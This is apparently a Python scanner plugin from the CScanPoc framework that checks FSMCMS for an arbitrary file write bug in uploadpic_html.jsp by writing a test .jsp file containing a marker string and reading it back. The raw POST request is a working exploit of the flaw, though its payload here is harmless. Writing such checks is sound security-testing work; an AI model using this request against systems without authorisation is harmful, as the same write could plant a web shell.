# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'FSMCMS_0005'  # 平台漏洞编号，留空
    name = 'FSMCMS系统 任意文件写入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-10-10'  # 漏洞公布时间
    desc = '''
        北京东方文辉FSMCMS /cms/client/uploadpic_html.jsp 可写入任意文件。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0144274'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FSMCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1e94429f-1f6c-4c79-934e-746d9a748b31'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref http://www.wooyun.org/bugs/wooyun-2015-0144274/
            hh = hackhttp.hackhttp()
            arr = urllib.parse.urlparse(self.target)
            raw = '''
POST /cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1
Host: %s
Content-Length: 69
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0
Connection: keep-alive
Accept: */*
Accept-Encoding: gzip, deflate

<?xml version="1.0" encoding="UTF-8"?>

<root>

test_vul

</root>
''' % arr.netloc
            url = self.target + '/cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx'
            _code, _head, res, _errcode, _ = hh.http(url, raw=raw)
            if 'dGVzdF92dWw=' in res:
                payload = '/cms-data/temp_dir/xxxx/temp.files/xx.jsp'
                url = self.target + payload
                _code, _head, res, _errcode, _ = hh.http(url)
                if 'test_vul' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
